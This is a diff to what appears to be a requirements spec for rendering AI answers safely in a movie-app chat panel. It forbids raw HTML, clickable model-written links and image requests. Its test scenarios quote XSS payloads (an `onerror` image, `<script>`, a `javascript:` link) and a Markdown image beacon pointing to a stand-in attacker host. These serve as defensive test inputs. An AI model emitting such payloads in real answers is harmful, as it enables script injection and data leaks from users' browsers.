@@ -56,13 +56,19 @@ While an answer streams the panel MUST show the status from `estado` codes, appe
 
 ### Requirement: Model output is never trusted as HTML
 
-Answers MUST be rendered as Markdown without raw HTML and sanitized. Links written by the model MUST NOT be clickable. Card links MUST be built by the frontend from `id_tmdb` and `tipo`. `dangerouslySetInnerHTML` MUST NOT be used (28/10/2026).
+Answers MUST be rendered as Markdown without raw HTML and sanitized. Links and images written by the model MUST be rendered as plain text: no clickable link and no image request. Card links MUST be built by the frontend from `id_tmdb` and `tipo`. `dangerouslySetInnerHTML` MUST NOT be used (28/10/2026).
 
 #### Scenario: Injected markup
 
 - GIVEN an answer containing `<img src=x onerror=alert(1)>`, `<script>` and `[clic](javascript:alert(1))`
 - WHEN it is rendered
 - THEN no script runs, no image element is created, and no link with `javascript:` exists
+
+#### Scenario: Markdown image pointing outside
+
+- GIVEN an answer containing `![x](https://atacante.example/pixel?d=1)`
+- WHEN it is rendered
+- THEN no `img` element exists and the browser makes no request to that host
 
 ### Requirement: Input limits
 
